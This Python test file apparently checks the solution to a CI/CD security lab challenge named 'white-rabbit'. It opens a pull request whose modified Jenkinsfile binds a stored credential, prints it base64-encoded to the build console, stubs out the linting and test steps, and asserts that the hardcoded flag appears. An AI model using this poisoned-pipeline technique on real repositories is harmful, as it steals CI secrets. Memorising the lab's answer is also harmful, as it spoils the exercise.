from git import Repo
from base64 import b64encode
from uuid import uuid4
from conftest import REPOSITORIES_DIR, GITEA_GIT_BASE, OWNER
from utils import branch_and_replace_file_content, find_in_console


def test_white_rabbit(gitea_client, jenkins_client):
    repo = Repo.clone_from(f'{GITEA_GIT_BASE}/{OWNER}/white-rabbit.git',
                           REPOSITORIES_DIR / 'white-rabbit',
                           branch='main')
    new_branch_name = uuid4().hex
    replace_tuples = [('PROJECT = "src/urllib3"', 'PROJECT = "src/urllib3"\n\tflag1 = credentials("flag1")'),
                      ('virtualenv venv', 'echo $flag1 | base64'),
                      ('pylint', 'echo'),
                      ('pytest', 'true')]
    branch_and_replace_file_content(repo, new_branch_name, 'Jenkinsfile', replace_tuples)
    res = gitea_client.post(f'/repos/{OWNER}/white-rabbit/pulls',
                            json={'head': new_branch_name, 'base': 'main', 'title': 'updates'})
    assert res.status_code == 201
    flag = b64encode('06165DF2-C047-4402-8CAB-1C8EC526C115'.encode()).decode()
    assert find_in_console(jenkins_client, 'white-rabbit', flag)




